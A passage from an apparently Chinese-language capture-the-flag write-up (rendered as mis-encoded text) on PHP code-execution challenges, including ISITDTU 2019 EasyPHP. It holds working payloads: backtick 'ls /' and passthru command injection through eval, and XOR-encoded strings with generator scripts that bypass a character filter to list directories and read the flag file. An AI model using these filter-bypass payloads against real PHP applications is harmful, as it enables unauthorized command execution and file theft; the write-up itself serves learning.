&#x27;&lt;br&gt;&#x27;;<br>        eval($code);<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        die(<span class="hljs-string">&quot;ä½ æƒ³å¹²ä»€ä¹ˆï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿ&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    echo <span class="hljs-string">&quot;å±…ç„¶éƒ½ä¸è¾“å…¥å‚æ•°ï¼Œå¯æ¶!!!!!!!!!&quot;</span>;<br>    show<span class="hljs-constructor">_source(<span class="hljs-params">__FILE__</span>)</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>å­¦åˆ°äº†ä¸€äº›rceçš„æ–°æ–¹æ³•</p>
<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs clean">?<span class="hljs-keyword">code</span>=print(<span class="hljs-string">&#x27;l\s&#x27;</span>);<span class="hljs-comment">//åå¼•å·  print_rä¹Ÿå¯ä»¥</span><br>?<span class="hljs-keyword">code</span>=var_dump(â€˜l\sâ€™); <span class="hljs-comment">//éƒ½æ˜¯åå¼•å·</span><br>?<span class="hljs-keyword">code</span>=â€™l\s /|tee aâ€˜;  <span class="hljs-comment">//åå¼•å·ï¼Œç„¶åå»aæ–‡ä»¶çœ‹ç»“æœ</span><br></code></pre></td></tr></table></figure>
<p><img src="/images/6772E1B0EC1549c4ABF74D13DCC94062.png" srcset="/img/loading.gif" lazyload></p>
<p>è¿˜æœ‰ä¸€ç§æ˜¯å‚æ•°é€ƒé€¸æ‰§è¡Œä»»æ„å‘½ä»¤</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">?<span class="hljs-number">1</span>=passthru(<span class="hljs-string">&#x27;l\s /&#x27;</span>);&amp;code=<span class="hljs-keyword">eval</span>(<span class="hljs-keyword">pos</span>(<span class="hljs-keyword">pos</span>(get_defined_vars())));<br></code></pre></td></tr></table></figure>
<p><img src="/images/E9557FBEE74B428f9A3C80EAF2AE792C.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">getchwd</span><span class="hljs-params">()</span></span>ï¼šå‡½æ•°è¿”å›å½“å‰å·¥ä½œç›®å½•ã€‚<br><span class="hljs-function"><span class="hljs-title">scandir</span><span class="hljs-params">()</span></span>ï¼šå‡½æ•°è¿”å›æŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•çš„æ•°ç»„ã€‚<br><span class="hljs-function"><span class="hljs-title">dirname</span><span class="hljs-params">()</span></span>ï¼šå‡½æ•°è¿”å›è·¯å¾„ä¸­çš„ç›®å½•éƒ¨åˆ†ã€‚<br><span class="hljs-function"><span class="hljs-title">chdir</span><span class="hljs-params">()</span></span>ï¼šå‡½æ•°æ”¹å˜å½“å‰çš„ç›®å½•ã€‚<br><span class="hljs-function"><span class="hljs-title">readfile</span><span class="hljs-params">()</span></span>ï¼šè¾“å‡ºä¸€ä¸ªæ–‡ä»¶ã€‚<br><span class="hljs-function"><span class="hljs-title">current</span><span class="hljs-params">()</span></span>ï¼šè¿”å›æ•°ç»„ä¸­çš„å½“å‰å•å…ƒ, é»˜è®¤å–ç¬¬ä¸€ä¸ªå€¼ã€‚<br><span class="hljs-function"><span class="hljs-title">pos</span><span class="hljs-params">()</span></span>ï¼š<span class="hljs-built_in">current</span>() çš„åˆ«åã€‚<br><span class="hljs-function"><span class="hljs-title">next</span><span class="hljs-params">()</span></span>ï¼šå‡½æ•°å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚<br><span class="hljs-function"><span class="hljs-title">end</span><span class="hljs-params">()</span></span>ï¼šå°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚<br><span class="hljs-function"><span class="hljs-title">array_rand</span><span class="hljs-params">()</span></span>ï¼šå‡½æ•°è¿”å›æ•°ç»„ä¸­çš„éšæœºé”®åï¼Œæˆ–è€…å¦‚æœæ‚¨è§„å®šå‡½æ•°è¿”å›ä¸åªä¸€ä¸ªé”®åï¼Œåˆ™è¿”å›åŒ…å«éšæœºé”®åçš„æ•°ç»„ã€‚<br><span class="hljs-function"><span class="hljs-title">array_flip</span><span class="hljs-params">()</span></span>ï¼š<span class="hljs-built_in">array_flip</span>() å‡½æ•°ç”¨äºåè½¬/äº¤æ¢æ•°ç»„ä¸­æ‰€æœ‰çš„é”®åä»¥åŠå®ƒä»¬å…³è”çš„é”®å€¼ã€‚<br><span class="hljs-function"><span class="hljs-title">array_slice</span><span class="hljs-params">()</span></span>ï¼šå‡½æ•°åœ¨æ•°ç»„ä¸­æ ¹æ®æ¡ä»¶å–å‡ºä¸€æ®µå€¼ï¼Œå¹¶è¿”å›ã€‚<br><span class="hljs-function"><span class="hljs-title">array_reverse</span><span class="hljs-params">()</span></span>ï¼šå‡½æ•°è¿”å›ç¿»è½¬é¡ºåºçš„æ•°ç»„ã€‚<br><span class="hljs-function"><span class="hljs-title">chr</span><span class="hljs-params">()</span></span> å‡½æ•°ä»æŒ‡å®šçš„ï¼šASCII å€¼è¿”å›å­—ç¬¦ã€‚<br><span class="hljs-function"><span class="hljs-title">hex2bin</span><span class="hljs-params">()</span></span>ï¼šâ€” è½¬æ¢åå…­è¿›åˆ¶å­—ç¬¦ä¸²ä¸ºäºŒè¿›åˆ¶å­—ç¬¦ä¸²ã€‚<br><span class="hljs-function"><span class="hljs-title">getenv</span><span class="hljs-params">()</span></span>ï¼šè·å–ä¸€ä¸ªç¯å¢ƒå˜é‡çš„å€¼(åœ¨<span class="hljs-number">7.1</span>ä¹‹åå¯ä»¥ä¸ç»™äºˆå‚æ•°)ã€‚<br><span class="hljs-function"><span class="hljs-title">localeconv</span><span class="hljs-params">()</span></span>ï¼šå‡½æ•°è¿”å›ä¸€åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„ã€‚<br><span class="hljs-function"><span class="hljs-title">get_defined_vars</span><span class="hljs-params">()</span></span>: è¿”å›ç”±æ‰€æœ‰å·²å®šä¹‰å˜é‡æ‰€ç»„æˆçš„æ•°ç»„<br></code></pre></td></tr></table></figure>


<h2 id="ISITDTU-2019-EasyPHP"><a href="#ISITDTU-2019-EasyPHP" class="headerlink" title="[ISITDTU 2019]EasyPHP"></a>[ISITDTU 2019]EasyPHP</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-variable">$_</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;_&#x27;</span>];<br><span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[\x00- 0-9\&#x27;&quot;`$&amp;.,|[&#123;_defgops\x7F]+/i&#x27;</span>, <span class="hljs-variable">$_</span>) )<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;rosÃ© will not do it&#x27;</span>);<br><br><span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-title function_ invoke__">count_chars</span>(<span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$_</span>), <span class="hljs-number">0x3</span>)) &gt; <span class="hljs-number">0xd</span> )<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;you are so close, omg&#x27;</span>);<br><br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://regex101.com/">æ­£åˆ™åŒ¹é…åœ¨çº¿ç½‘ç«™</a><br>ç”¨ç€è¿˜ä¸é”™ï¼Œè™½ç„¶æ˜¯è‹±æ–‡çš„<br>å› ä¸ºæ­£åˆ™ç¦ç”¨çš„å­—ç¬¦æœ‰ç‚¹å¤šï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”¨å¼‚æˆ–æˆ–è€…å–å<br>å…ˆå–å<br><img src="/images/04C366AE5B5F43908D4449A029E965A4.png" srcset="/img/loading.gif" lazyload><br>phpinfoå¯ä»¥é€šè¿‡å–åè·å¾—<br>å¯ä»¥çœ‹åˆ°disable_functionsç¦ç”¨äº†å¤§é‡ç³»ç»Ÿå‡½æ•°ï¼ŒåŒæ—¶ä¹Ÿé™åˆ¶äº†open_basediråœ¨&#x2F;var&#x2F;www&#x2F;htmlï¼Œä¸‹ä¸€æ­¥æ˜¯æ‰¾flagæ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨scandir()æˆ–è€…glob()å‡½æ•°åˆ—ç›®å½•ï¼Œä½†å®ƒè¿”å›ä¸€ä¸ªæ•°ç»„ï¼Œæˆ‘ä»¬è¿˜éœ€è¦ä¸€ä¸ªprint_ræˆ–var_dump<br>æ‰€ä»¥æˆ‘ä»¬éœ€è¦çš„å¼å­ä¸ºprint_r(scandir(.))<br>å†ç”¨å–åæ‰§è¡Œä¸€å¥è¯æœ¨é©¬æˆ–è€…å‘½ä»¤è¯­å¥ä¼šå› ä¸ºç¬¬äºŒä¸ªifè€Œæ— æ³•æ‰§è¡Œï¼Œå–åè¿™æ—¶æ˜¯æ²¡æœ‰åŠæ³•ç»•è¿‡çš„</p>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lisp">if ( <span class="hljs-name">strlen</span>(<span class="hljs-name">count_chars</span>(<span class="hljs-name">strtolower</span>($_), <span class="hljs-number">0</span>x3)) &gt; <span class="hljs-number">0</span>xd )<br>    die(&#x27;you are so close, omg&#x27;)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
<p>è¿™ä¸ªifçš„æ„æ€æ˜¯è¾“å…¥çš„å­—ç¬¦ä¸²ä¸èƒ½è¶…è¿‡13ç§å­—ç¬¦ï¼Œå°±æ˜¯è¦ä¸åŒçš„13ç§å­—ç¬¦ï¼Œé‡å¤çš„ä¸ç®—å…¥æ–°çš„å­—ç¬¦</p>
<p>è¿™æ—¶å°±éœ€è¦å¼‚æˆ–æ¥ç»•è¿‡äº†</p>
<p>å¼‚æˆ–ç»•è¿‡è„šæœ¬</p>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs mel">&lt;?php<br><br>#ç”¨ä¸å¯è§å­—ç¬¦å¼‚æˆ–<br>$l = <span class="hljs-string">&quot;&quot;</span>;<br>$r = <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-comment">//$argv = str_split(&quot;_GET&quot;);</span><br>$argv = str_split(<span class="hljs-string">&quot;phpinfo&quot;</span>);<br><span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>;$i&lt;count($argv);$i++)<br>&#123;<br>    <span class="hljs-keyword">for</span>($j=<span class="hljs-number">0</span>;$j&lt;<span class="hljs-number">255</span>;$j++)<br>    &#123;<br>        $k = chr($j)^chr(<span class="hljs-number">255</span>);<br>        <span class="hljs-keyword">if</span>($k == $argv[$i])&#123;<br>            <span class="hljs-keyword">if</span>($j&lt;<span class="hljs-number">16</span>)&#123;<br>                $l .= <span class="hljs-string">&quot;%ff&quot;</span>;<br>                $r .= <span class="hljs-string">&quot;%0&quot;</span> . dechex($j);<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            $l .= <span class="hljs-string">&quot;%ff&quot;</span>;<br>            $r .= <span class="hljs-string">&quot;%&quot;</span> . dechex($j);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>    &#125;<br>&#125;<br>echo <span class="hljs-string">&quot;(&quot;</span>.$l.<span class="hljs-string">&quot;^&quot;</span>.$r.<span class="hljs-string">&quot;)&quot;</span>;<br>#&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;       =_GET<br>#?_=$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=phpinfo<br>?&gt;<br></code></pre></td></tr></table></figure>

<p>è·å¾—çš„å¼‚æˆ–å¼å­print_r(scandir(.))</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">((<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>)^(<span class="hljs-variable">%8</span>f<span class="hljs-variable">%8</span>d<span class="hljs-variable">%96</span><span class="hljs-variable">%91</span><span class="hljs-variable">%8</span>b<span class="hljs-variable">%a0</span><span class="hljs-variable">%8</span>d))(((<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>)^(<span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span>e<span class="hljs-variable">%91</span><span class="hljs-variable">%9</span>b<span class="hljs-variable">%96</span><span class="hljs-variable">%8</span>d))((<span class="hljs-variable">%ff</span>)^(<span class="hljs-variable">%d1</span>)))<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
<p>å‘ç°è¿˜æ˜¯æ²¡æœ‰é€šè¿‡ç¬¬äºŒä¸ªifï¼Œä¸”ç”¨äº†16ä¸ªä¸åŒå­—ç¬¦ï¼Œä¸‹ä¸€æ­¥éœ€è¦ç¼©å‡å­—ç¬¦æ•°<br><img src="/images/C19D81C0EE214c5dBEA86E2EFBA4AD04.png" srcset="/img/loading.gif" lazyload><br>é™¤å»å¿…è¦å­—ç¬¦å¤–()^;æˆ‘ä»¬è¿˜æœ‰12ä¸ªä¸åŒå­—ç¬¦ï¼Œ%ffå¾ˆé‡è¦æ‰€ä»¥ä¸èƒ½å»æ‰ï¼Œå…ˆä¸åŒ…å«å®ƒï¼Œæ‰€ä»¥æˆ‘ä»¬ç°åœ¨æœ‰11ä¸ªä¸åŒå­—ç¬¦ï¼Œéœ€è¦å†å»æ‰3ä¸ªï¼Œ8+%ff(å¿…è¦)+4(å¿…è¦å­—ç¬¦) &#x3D; 13  åˆšåˆšå¥½<br>ç°åœ¨æˆ‘ä»¬è¦åšçš„æ˜¯åœ¨è¿™11ä¸ªå­—ç¬¦ç§å»æ‰3ä¸ªï¼Œç„¶åå†è®©å®ƒä»¬ä¹‹é—´ç›¸äº’å¼‚æˆ–ï¼Œä»¥å¾—åˆ°å»æ‰çš„é‚£3ä¸ªå­—ç¬¦çš„å€¼(é‚£ä¸‰ä¸ªå€¼éšæ„)</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">result2 = [<span class="hljs-number">0x8b</span>, <span class="hljs-number">0x9b</span>, <span class="hljs-number">0xa0</span>, <span class="hljs-number">0x9c</span>, <span class="hljs-number">0x8f</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x9e</span>, <span class="hljs-number">0xd1</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x8d</span>, <span class="hljs-number">0x8c</span>]  #é™¤å»å¿…è¦å­—ç¬¦çš„<span class="hljs-number">11</span>ä¸ªä¸åŒå­—ç¬¦<br>result = [<span class="hljs-number">0x9b</span>, <span class="hljs-number">0xa0</span>, <span class="hljs-number">0x9c</span>, <span class="hljs-number">0x8f</span>, <span class="hljs-number">0x9e</span>, <span class="hljs-number">0xd1</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x8c</span>]  # å»æ‰<span class="hljs-number">3</span>ä¸ªå­—ç¬¦åçš„ä¸åŒå­—ç¬¦,è¿™é‡Œæˆ‘ä»¬æŠŠntrå»æ‰äº†<br>temp = []<br>for d <span class="hljs-keyword">in</span> result2:<br>    for a <span class="hljs-keyword">in</span> result:<br>        for b <span class="hljs-keyword">in</span> result:<br>            for c <span class="hljs-keyword">in</span> result:<br>                if (a ^ b ^ c == d):<br>                    if a == b == c == d:<br>                        continue<br><span class="hljs-symbol">                    else:</span><br>                        print(<span class="hljs-string">&quot;a=0x%x,b=0x%x,c=0x%x,d=0x%x&quot;</span> % (a, b, c, d))<br>                        if d <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> temp:<br>                            temp<span class="hljs-number">.</span>append(d)<br>print(len(temp), temp)<br></code></pre></td></tr></table></figure>

<p>print_ræºå¼å­</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">(<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>)^(<span class="hljs-variable">%8</span>f<span class="hljs-variable">%8</span>d<span class="hljs-variable">%96</span><span class="hljs-variable">%91</span><span class="hljs-variable">%8</span>b<span class="hljs-variable">%a0</span><span class="hljs-variable">%8</span>d)<br></code></pre></td></tr></table></figure>

<p>ç¼©å‡åçš„</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">(<span class="hljs-variable">%8</span>f<span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%96</span><span class="hljs-variable">%9</span>b<span class="hljs-variable">%9</span>b<span class="hljs-variable">%a0</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span>)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%9</span>e<span class="hljs-variable">%ff</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%9</span>e)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%8</span>f<span class="hljs-variable">%ff</span><span class="hljs-variable">%96</span><span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%8</span>f)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>)<br></code></pre></td></tr></table></figure>

<p>scandiræºå¼å­</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">(<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>)^(<span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span>e<span class="hljs-variable">%91</span><span class="hljs-variable">%9</span>b<span class="hljs-variable">%96</span><span class="hljs-variable">%8</span>d)<br></code></pre></td></tr></table></figure>
<p>ä¸¤ä¸ª%ffç›¸äº’å¼‚æˆ–ä¸º0ï¼Œæ‰€ä»¥ç¼©å‡åæœªæ”¹å˜åŸå€¼<br>ç¼©å‡åçš„</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">(<span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span>e<span class="hljs-variable">%9</span>b<span class="hljs-variable">%9</span>b<span class="hljs-variable">%96</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span>)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%9</span>e)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%96</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%8</span>f)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>)<br></code></pre></td></tr></table></figure>
<p>.çš„å¼‚æˆ–æœªæ”¹å˜</p>
<p>ä¸¤å¼å­åˆäºŒä¸ºä¸€</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">((<span class="hljs-variable">%8</span>f<span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%96</span><span class="hljs-variable">%9</span>b<span class="hljs-variable">%9</span>b<span class="hljs-variable">%a0</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span>)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%9</span>e<span class="hljs-variable">%ff</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%9</span>e)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%8</span>f<span class="hljs-variable">%ff</span><span class="hljs-variable">%96</span><span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%8</span>f)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>))(((<span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span>e<span class="hljs-variable">%9</span>b<span class="hljs-variable">%9</span>b<span class="hljs-variable">%96</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span>)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%9</span>e)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%96</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%8</span>f)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>))((<span class="hljs-variable">%ff</span>)^(<span class="hljs-variable">%d1</span>)))<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>

<p><img src="/images/DA04F3C07BA94df6B6419D4B06D8C0E5.png" srcset="/img/loading.gif" lazyload><br>å®Œæˆï¼Œä½†è¿™ä¸ªflagéœ€è¦è¯»å–ï¼Œæ— æ³•ç›´æ¥è®¿é—®<br>é‚£ä¹ˆæˆ‘ä»¬å†æ„é€ ä¸€ä¸ªè¯­å¥ï¼Œscandirè¿”å›çš„æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œä¸”åˆšæ‰çš„ç»“æœæ˜¾ç¤ºæˆ‘ä»¬è¦æ‰¾çš„æ–‡ä»¶å†scandirçš„ç»“æœæœ€åé¢ï¼Œé‚£ä¹ˆç”¨end()æ–¹æ³•å°±å¯ä»¥å¾—åˆ°æ–‡ä»¶åäº†ï¼Œè¯»æ–‡ä»¶å¯ä»¥ç”¨show_sourceæˆ–è€…readfile<br>æ„é€ è¯­å¥show_source(end(scandir(.)));<br>å…ˆç®€å•å¼‚æˆ–æ„é€ </p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">(<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>^<span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%97</span><span class="hljs-variable">%90</span><span class="hljs-variable">%88</span><span class="hljs-variable">%a0</span><span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%90</span><span class="hljs-variable">%8</span>a<span class="hljs-variable">%8</span>d<span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span>a)(<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>^<span class="hljs-variable">%9</span>a<span class="hljs-variable">%91</span><span class="hljs-variable">%9</span>b(<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>^<span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span>e<span class="hljs-variable">%91</span><span class="hljs-variable">%9</span>b<span class="hljs-variable">%96</span><span class="hljs-variable">%8</span>d)(<span class="hljs-variable">%ff</span>^<span class="hljs-variable">%d1</span>))<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>


<p>å‘ç°æœ‰19ä¸ªä¸åŒå­—ç¬¦ï¼Œé‚£ä¹ˆæˆ‘ä»¬éœ€è¦å»æ‰6ä¸ªå­—ç¬¦ï¼Œè¿™é‡Œæˆ‘ä»¬å»æ‰çš„æ˜¯h r o u a i</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs routeros">result2 = [0x8c, 0x97, 0x90, 0x88, 0xa0, 0x8a, 0x8d, 0x9c, 0x9a, 0x91, 0x9b, 0x9e, 0x96, 0xd1]<br>result = [0x8c, 0xa0, 0x88, 0x9c, 0x9a, 0x91, 0x9b, 0xd1] <br>temp = []<br><span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> result2:<br>    <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> result:<br>        <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> result:<br>            <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> result:<br>                <span class="hljs-keyword">if</span> (a ^ b ^ c == d):<br>                    <span class="hljs-keyword">if</span> a == b == c == d:<br>                        continue<br>                    <span class="hljs-keyword">else</span>:<br>                        <span class="hljs-built_in">print</span>(<span 